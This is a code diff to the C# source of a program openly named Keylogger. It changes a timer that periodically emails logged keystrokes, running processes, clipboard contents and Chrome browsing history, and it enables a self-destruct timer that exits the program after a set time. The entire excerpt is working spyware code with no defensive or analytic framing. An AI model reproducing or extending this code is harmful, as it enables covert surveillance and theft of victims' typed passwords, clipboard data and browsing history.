@@ -105,20 +105,29 @@ namespace Keylogger
             File.WriteAllText(pathClipboard, string.Empty);
             File.WriteAllText(pathHistoryChrome, string.Empty);
 
-            //Send email every 1 min
+            //Send email every x min
+            int asd1 = 0, asd2 = 0;
+
             var startTimeSpan = TimeSpan.Zero;
             var periodTimeSpan = TimeSpan.FromMinutes(time);
-            var timer = new System.Threading.Timer((E) =>
+            var timer = new System.Threading.Timer((ignore) =>
             {
-                getActiveProcessesAndSendEmail(pathKeys, pathProcesses, pathClipboard, boxes, pathHistoryChrome);
+                if (asd1 == 1)
+                    getActiveProcessesAndSendEmail(pathKeys, pathProcesses, pathClipboard, boxes, pathHistoryChrome);
+                asd1 = 1;
             }, null, startTimeSpan, periodTimeSpan);
 
-            //var timeUntillAutodestruction = TimeSpan.FromMinutes(timeAutodestruct);
-            //var autodestruction = new System.Threading.Timer((E) =>
-            //{
-            //    System.Environment.Exit(0);
-            //}, null, startTimeSpan, timeUntillAutodestruction);
+            //////////////////
+            
+            var timeUntillAutodestruction = TimeSpan.FromMinutes(timeAutodestruct+1);
+            var autodestruction = new System.Threading.Timer((ignore) =>
+            {
+                if (asd2 == 1)
+                    System.Environment.Exit(0);
+                asd2 = 1;
+            }, null, startTimeSpan, timeUntillAutodestruction);
 
+            ///////////////////
             string clipboardContent = Clipboard.GetText();
             while (true)
             {
@@ -453,12 +462,14 @@ namespace Keylogger
 
                 for (int i = 0; i < cnt; i++)
                 {
-                    sw.WriteLine(i+1 + ") " + list[i].VisitedTime + " -> " + list[i].URL);
+                    sw.WriteLine(i + 1 + ") " + list[i].VisitedTime + " -> " + list[i].URL);
                 }
                 sw.WriteLine("\n--END--\n");
             }
 
         }
+
+
 
         /////////////get req/////////////////////////////////////////
 
